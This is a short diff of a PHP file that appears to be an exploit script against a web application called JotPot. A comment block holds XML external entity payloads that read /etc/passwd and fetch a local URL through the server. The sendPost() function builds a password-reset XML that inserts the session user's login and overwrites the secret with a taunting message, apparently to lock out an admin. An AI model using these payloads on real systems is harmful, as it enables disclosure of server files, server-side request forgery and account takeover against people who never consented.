@@ -8,19 +8,31 @@ include_once "includer.php";
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE own [ <!ELEMENT own ANY >
     <!ENTITY own SYSTEM "file:///etc/passwd" >]>
+    <reset>
+        <login>&own;</login>
+        <secret>password</secret>
+    </reset>
 
-
+    <?xml version="1.0" encoding="utf-8"?>
+    <!DOCTYPE root [
+    <!ENTITY secr SYSTEM "http://localhost:8080/JotPot/README.md">
+    ]>
+    <reset>
+        <login>&secr;</login>
+        <secret>Adadfbbf</secret>
+    </reset>
 */
 
 function sendPost(){
     
+    $who = $_SESSION["login"];
     $xml = <<<XML
-    <?xml version="1.0" encoding="UTF-8"?>
-    <!DOCTYPE own [ <!ELEMENT own ANY >
-    <!ENTITY own SYSTEM "file:///etc/passwd" >]>
+    <?xml version="1.0" encoding="utf-8"?>
+    <!DOCTYPE root [
+    ]>
     <reset>
-        <login>&own;</login>
-        <secret>password</secret>
+        <login>$who</login>
+        <secret>You aren't an admin anymore, LOL</secret>
     </reset>
     XML;
 
